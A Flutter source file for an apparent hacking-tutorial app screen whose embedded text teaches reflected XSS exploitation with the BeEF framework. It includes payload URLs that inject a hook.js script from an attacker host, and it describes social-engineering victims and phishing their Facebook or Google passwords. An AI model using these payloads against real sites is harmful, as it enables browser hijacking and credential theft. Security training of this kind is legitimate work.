import 'package:flutter/material.dart';
import 'package:hackerstudiopro/bug_bounty/web_main.dart';

class BountyTen extends StatefulWidget {
  @override
  _BountyTenState createState() => _BountyTenState();
}

class _BountyTenState extends State<BountyTen> {
  var text = '''
  Cross-Site Scripting (XSS)
I can't talk about web application vulnerabilities without talking about Cross-Site Scripting (XSS). This is probably one of the most common vulnerabilities that I come across. XSS is a user attack that is caused by a lack of input validation by the application. There are two types of XSS: reflective (non-persistent) and stored (persistent). Both allow an attacker to write script code into a user's browsers. I am going to focus on reflective XSS, which is the more common type and is relatively similar to stored XSS in terms of vulnerability exploitation.

BeEF Exploitation Framework
(http://beefproject.com/)(Kali Linux)
The general question I get from my clients is, "How much harm can an XSS really cause?" With this vulnerability you have the full ability to write scripting code on the end user's browser, so anything that you do in JavaScript could be used against the victim. In this section, we will dive into how malicious you can be with an XSS attack.The best tool I have seen used with XSS attacks is the BeEF Exploitation Framework. If you find an XSS, not only can you cause a victim to become part of your pseudo-botnet, but you can also steal the contents of the copy memory, redirect them to links, turn on their camera, and so much more. If you do find a valid XSS on a site, you will need to craft your XSS findings to utilize the BeEF Framework. For our XSS examples in this chapter, we are going to use an XSS that was identified from our initial Burp Active Scans. Let's take the example vulnerable URL:

http://www.securepla.net/xss_example/example.php?alert=test'<script>[iframe]</script>.
From the Setting Up a Penetration Box section, we installed BeEF into /opt/beef/. We are going to have to first start the BeEF service.

Starting BeEF Commands:
● cd /opt/beef/
● ./beef

  ''';
  var text1 = '''
  Let's log into the console UI after the BeEF server has started. As we see from the image above, the UI URL in this case is located at http://127.0.0.1:3000/ui/authentication. We can open a browser and go to that URL.
  ''';
  var text2 = '''
  If everything started up successfully, you will be able to log into the UI using the username “beef” and password “beef”. If we look at the image where we loaded BeEF via the command line, we see a URL for both the UI page and the hook page (Hook URL). Let's take a moment to review the hook page (hook.js).
  ''';
  var text3 = '''
  Although this JavaScript has been well obfuscated, this is the payload that will control the victim user and will be injected into the victim browser's page. Once injected, their browser will connect back into your central server with the victim unaware. LAB - XSS on OWASPBWA
We were able to identify an XSS via Burp or ZAP on our vulnerable Web Application VM (OWASPBWA). So, we can directly access the vulnerable XSS by connecting to our web service:

	●[IP_of_OWASPBWA]/owaspbricks/content-2/index.php?user=harry3a201<script>alert(1)<%2fscript>6f350

Since we have located an XSS vulnerability on a page, we can now use BeEF to help with theexploitation of the end user. In our initial example, http://[IP_of_OWASPBWA]/owaspbricks/content-2/index.php?user=, the user variable takes any input and presents it to the end user. This proves that the end user does process the JavaScript code embedded from our query.
  ''';
  var text4 = '''
  To create a successful exploit, instead of printing an alert, we are going to craft a URL that uses JavaScript to include the hook.js file. It will look something like:
●http://192.168.1.124/owaspbricks/content-2/index.php?user=harry3a201<scriptsrc=http://192.168.1.123:3000/hook.js></script>

I was able to append the hook.js script by using the JavaScript code:

● <script src=[URL with hook.js]></script>

Remember that if this is done on a public site, then the URL will need to point to a public address that hosts the hook.js page and listening service. Once you trick a victim into going to that URL using Social Engineering Tactics, they will become a part of your XSS zombie network. Going back to our UI panel, we should now see that a victim has joined our server.
  ''';
  var text5 = '''
  With an account hooked, there are many different modules within BeEF to exploit the end user. As seen in the image above, you can try to steal stored credentials, get host IP information, scan hosts within their network, and much more. One of my favorite attacks is called "pretty theft" because of its simplicity. Drop down to the Social Engineering folder, select Pretty Theft, then configure it how you want in this case, we will use the Facebook example, and hit execute. Remember that the IP for the custom logo field has to be your BeEF IP. This will allow the victim to grab the image from your server.
  ''';
  var text6 = '''
  After the attack is submitted, a Facebook password prompt will pop up onto the victim's system. This is where you can get creative by using a popup in which your target users would most likely enter their information. If you are looking to gain Google accounts, there is also a Google Phishing module.The benefit of this client-side attack is that the ordinary-looking password prompt popup keeps the user unaware that they are part of this zombie network.
  ''';
  var text7 = '''
  After the unsuspecting victim types in their password, go back to the UI to find your loot. Clicking on the ID “0” will show the attacker what the victim typed into that box. This should be enough to start gaining some access as the user, allowing you to move laterally through the environment.
  ''';
  var text8 = '''
  I hope I was able to demonstrate how powerful an XSS vulnerability can be. It is exponentially worse if the XSS finding was a stored XSS versus the reflective XSS example we just saw. If it had been a stored XSS, we most likely wouldn't even need to use social engineering tactics on the victim to go to the link; we would just need to wait until our code was executed by the victim’s system.
  ''';
  @override
  Widget build(BuildContext context) {
    var size = MediaQuery.of(context).size;
    return Scaffold(
      body: Stack(
        children: <Widget>[
          Container(
            // Here the height of the container is 45% of our total height
            height: size.height * .45,
            decoration: BoxDecoration(
              color: Color(0xFFF5CEB8),
              image: DecorationImage(
                alignment: Alignment.centerLeft,
                image: AssetImage("assets/images/undraw_pilates_gpdb.png"),
              ),
            ),
          ),
          SafeArea(
            child: Column(
              children: <Widget>[
                Align(
                  alignment: Alignment.topLeft,
                  child: GestureDetector(
                    onTap: () => Navigator.pushReplacement(context,
                        MaterialPageRoute(builder: (context) => WebMain())),
                    child: Container(
                      alignment: Alignment.center,
                      height: 52,
                      width: 52,
                      decoration: BoxDecoration(
                        color: Color(0xFFF2BEA1),
                        // color:Colors.orange,
                        shape: BoxShape.circle,
                      ),
                      child: Icon(Icons.arrow_back_ios, color: Colors.white),
                    ),
                  ),
                ),
                Text("Cross-Site Scripting",
                    style: TextStyle(
                        fontSize: 30,
                        color: Colors.grey,
                        fontWeight: FontWeight.bold)),
                Expanded(
                  child: Padding(
                    padding: const EdgeInsets.all(8.0),
                    child: ListView(
                      children: <Widget>[
                        Text(
                          text,
                          textAlign: TextAlign.justify,
                          style: TextStyle(fontSize: 16, fontFamily: "Cairo"),
                        ),
                       Container(child: Image.asset('assets/images/xxs.jpg')),
                       Text(
                          text1,
                          textAlign: TextAlign.justify,
                          style: TextStyle(fontSize: 16, fontFamily: "Cairo"),
                        ),
                        Container(child: Image.asset('assets/images/xxs1.jpg')),
                        Text(
                          text2,
                          textAlign: TextAlign.justify,
                          style: TextStyle(fontSize: 16, fontFamily: "Cairo"),
                        ),

                        Container(child: Image.asset('assets/images/xxs2.jpg')),
                        Text(
                          text3,
                          textAlign: TextAlign.justify,
                          style: TextStyle(fontSize: 16, fontFamily: "Cairo"),
                        ),
                        Container(child: Image.asset('assets/images/xxs3.jpg')),
                        Text(
                          text4,
                          textAlign: TextAlign.justify,
                          style: TextStyle(fontSize: 16, fontFamily: "Cairo"),
                        ),
                        Container(child: Image.asset('assets/images/xxs4.jpg')),
                        Text(
                          text5,
                          textAlign: TextAlign.justify,
                          style: TextStyle(fontSize: 16, fontFamily: "Cairo"),
                        ),
                        Container(child: Image.asset('assets/images/xxs5.jpg')),
                        Text(
                          text6,
                          textAlign: TextAlign.justify,
                          style: TextStyle(fontSize: 16, fontFamily: "Cairo"),
                        ),
                        Container(child: Image.asset('assets/images/xxs66.jpg')),
                        Text(
                          text7,
                          textAlign: TextAlign.justify,
                          style: TextStyle(fontSize: 16, fontFamily: "Cairo"),
                        ),
                        Container(child: Image.asset('assets/images/xxs6.jpg')),
                        Text(
                          text7,
                          textAlign: TextAlign.justify,
                          style: TextStyle(fontSize: 16, fontFamily: "Cairo"),
                        ),
                        RaisedButton(
                          child: Text(
                              "Follow me on Social Media if you have Questions"),
                          onPressed: () {
                            followMe();
                          },
                          color: Color(0xFFF2BEA1),
                        )
                      ],
                    ),
                  ),
                )
              ],
            ),
          )
        ],
      ),
    );
  }

  void followMe() {
    showDialog(
      barrierDismissible: false,
        context: context,
        builder: (context) {
          return AlertDialog(
            backgroundColor: Color(0xFFF5CEB8),
            title: Text('Follow me'),
            content: Text("Twitter: @Millime64755564"),
            actions: <Widget>[
              FlatButton(
                  onPressed: () => Navigator.pop(context), child: Text('Exit'))
            ],
          );
        });
  }
}
